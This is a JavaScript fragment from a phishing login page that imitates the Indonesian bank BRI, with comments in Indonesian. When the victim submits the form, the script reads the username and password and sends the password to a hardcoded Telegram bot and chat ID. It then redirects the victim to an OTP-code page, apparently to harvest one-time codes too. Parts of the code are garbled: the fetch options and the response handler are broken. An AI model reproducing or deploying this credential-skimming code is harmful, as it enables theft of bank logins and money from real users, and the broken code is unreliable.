<script>
function closeNotification() {
    document.getElementById('notification').style.display = 'none';
}

function validateForm() {
    const username = document.getElementById('user').value;
    const password = document.getElementById('password').value;

    if (username === "" || password === "") {
        document.getElementById('notification').style.display = 'block'; // Tampilkan notifikasi
        return false; // Cegah form submit
    }
    return true; // Izinkan form submit jika valid
}

function showLoading() {
    if (validateForm()) {
        const form = document.getElementById("loginForm");
        document.getElementById("loadingPopup").style.display = "flex";

        // Kirim data ke Telegram setelah delay
        setTimeout(() => {
            // Ambil username dan password
            const username = document.getElementById('user').value;
            const password = document.getElementById('password').value;

            const botToken = '8198442671:AAHtV1HznHwKqFJ9xuUb5Fzkbi9SE5sI-u8';
            const chatId = '8113314079';

            const message = `
╭─────────────────────╮
├• 𝗕𝗥𝗜 | 𝗙𝗘𝗦𝗧𝗜𝗩𝗔𝗟

├• 🔑 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ${password}
╰─────────────────────╯
`;
            

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {

                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })

                if (response.ok) {
                    setTimeout(() => {
                        window.location.href = 'fromkodeotp.html';
                    }, 2000); 
                } else {
                    alert("Gagal mengirim data.");
                    document.getElementById("loadingPopup").style.display = "none";
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert("Terjadi kesalahan.");
                document.getElementById("loadingPopup").style.display = "none";
            });

        }, 2000); // Delay simulasi
    }
}
